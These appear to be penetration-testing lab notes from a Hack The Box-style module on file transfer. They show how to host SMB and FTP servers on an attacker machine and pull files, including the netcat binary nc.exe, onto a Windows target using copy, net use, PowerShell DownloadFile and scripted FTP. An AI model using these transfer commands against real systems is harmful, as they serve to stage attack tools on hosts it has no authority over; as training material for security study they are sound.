## SMB Downloads
### Create the SMB Server

```Shell
3kjS@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
```
### Copy a File from the SMB Server

```Powershell
C:\htb> copy \\192.168.220.133\share\nc.exe 
		1 file(s) copied.
```

New versions of Windows block unauthenticated guest access, as we can see in the following command:

```Powershell
C:\htb> copy \\192.168.220.133\share\nc.exe 
You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

### Create the SMB Server with a Username and Password

```Shell
3kjS@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Mount the SMB Server with Username and Password

```Powershell
C:\htb> net use n: \\192.168.220.133\share /user:test test 
The command completed successfully. 
C:\htb> copy n:\nc.exe 1 file(s) copied.
```

___
## FTP Downloads

### Installing the FTP Server Python3 Module - pyftpdlib

```Shell
3kjS@htb[/htb]$ sudo pip3 install pyftpdlib
```

### Setting up a Python3 FTP Server

```Shell
3kjS@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
```

### Transferring Files from an FTP Server Using PowerShell

```Powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### Create a Command File for the FTP Client and Download the Target File

```CMD
C:\htb> echo open 192.168.49.128 > ftpcommand.txt 
C:\htb> echo USER anonymous >> ftpcommand.txt 
C:\htb> echo binary >> ftpcommand.txt 
C:\htb> echo GET file.txt >> ftpcommand.txt 
C:\htb> echo bye >> ftpcommand.txt 
C:\htb> ftp -v -n -s:ftpcommand.txt 
ftp> open 192.168.49.128 Log in with USER and PASS first. 
ftp> USER anonymous 

ftp> GET file.txt 
ftp> bye 

C:\htb>more file.txt This is a test file
```


